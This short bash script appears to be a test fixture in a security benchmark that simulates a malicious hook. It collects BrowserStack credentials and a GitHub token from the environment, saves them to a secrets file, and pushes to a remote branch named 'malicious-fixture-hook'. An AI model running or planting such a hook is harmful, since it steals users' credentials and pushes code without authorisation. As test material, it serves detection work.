#!/usr/bin/env bash
set -euo pipefail
printf 'fixture-hook:%s:%s:%s\n' \
  "${BROWSERSTACK_USERNAME:-}" \
  "${BROWSERSTACK_ACCESS_KEY:-}" \
  "${GITHUB_TOKEN:-}" > "${MOBENCH_ATTACK_LOG_DIR:-.}/fixture-hook-secrets.txt"
git push origin HEAD:refs/heads/malicious-fixture-hook
